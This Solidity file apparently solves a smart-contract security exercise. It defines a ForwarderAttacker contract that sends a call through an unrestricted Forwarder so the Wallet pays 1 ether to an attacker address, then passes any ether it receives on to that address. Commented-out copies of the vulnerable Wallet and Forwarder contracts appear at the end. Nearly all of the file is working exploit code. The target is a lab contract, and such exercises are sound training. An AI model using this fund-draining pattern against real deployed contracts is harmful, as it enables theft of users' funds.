//SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "../Forwarder.sol";
import "hardhat/console.sol";

contract ForwarderAttacker {
    Forwarder public forwarder;
    Wallet public wallet;
    address public attackerWallet;

    constructor(address _forwarder, address _wallet, address _attackerWallet) {
        forwarder = Forwarder(_forwarder);
        wallet = Wallet(_wallet);
        attackerWallet = _attackerWallet;
    }

    function attack() public {
        console.log("attack entered");
        console.log("attackerWallet address:", attackerWallet);
        // we need to abi.encode the function call in Wallet
        console.log("attack contract address:", address(this));
        bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", address(attackerWallet), 1 ether);
        console.log("debug1");
        forwarder.functionCall(address(wallet), data);
    }

    receive() external payable {
        console.log("ether received in attacker:", msg.value);
        (bool success,) = address(attackerWallet).call{value: msg.value}("");
        require(success, "Send To Attacker Wallet Successful");
        console.log("success send to attacker wallet", success);
    }
}

// contract Wallet {
//     address public immutable forwarder;

//     constructor(address _forwarder) payable {
//         require(msg.value == 1 ether);
//         forwarder = _forwarder;
//     }

//     function sendEther(address destination, uint256 amount) public {
//         require(msg.sender == forwarder, "sender must be forwarder contract");
//         (bool success, ) = destination.call{value: amount}("");
//         require(success, "failed");
//     }
// }

// contract Forwarder {
//     function functionCall(address a, bytes calldata data) public {
//         (bool success, ) = a.call(data);
//         require(success, "forward failed");
//     }
// }
